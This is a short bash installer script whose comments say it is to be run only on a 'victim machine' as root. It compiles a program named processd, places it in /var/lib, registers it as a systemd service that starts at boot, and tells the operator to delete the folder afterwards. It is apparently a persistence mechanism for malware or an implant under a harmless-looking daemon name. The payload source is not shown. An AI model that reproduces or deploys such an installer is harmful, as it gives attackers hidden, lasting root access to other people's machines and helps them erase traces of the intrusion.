#!/bin/bash

# This folder downloaded from git
# cd into same directory as install.sh
# Must run as root
# Only run on victim machine

if [[ $(id -u) != "0" ]]; then
    echo "Must run as root"
    exit 1
fi

gcc ./processd.c -o /var/lib/processd
chmod 500 /var/lib/processd

cp ./processd.service /etc/systemd/system/processd.service

systemctl start processd
systemctl enable processd

echo "Installed..."
echo "You should delete this folder now"
